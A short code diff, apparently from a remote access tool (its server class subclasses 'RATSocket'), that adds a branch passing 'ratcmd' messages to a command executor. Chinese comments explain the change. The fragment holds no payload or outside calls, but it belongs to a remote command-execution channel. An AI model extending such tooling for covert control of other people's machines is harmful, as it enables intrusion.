@@ -84,6 +84,12 @@ class Server(RATSocket):
         id = data.get('id')
         type = data.get('type')
         try:
+
+            if type == 'ratcmd':
+                # 直接将整个命令字典传给executor
+                return id, *self.command_executor.execute_command(id, data)
+
+
             # 如果是命令
             if type == 'command':
                 result = self.command_executor.execute_command(id, data.get('text')) #在这里把收到的命令id传过去
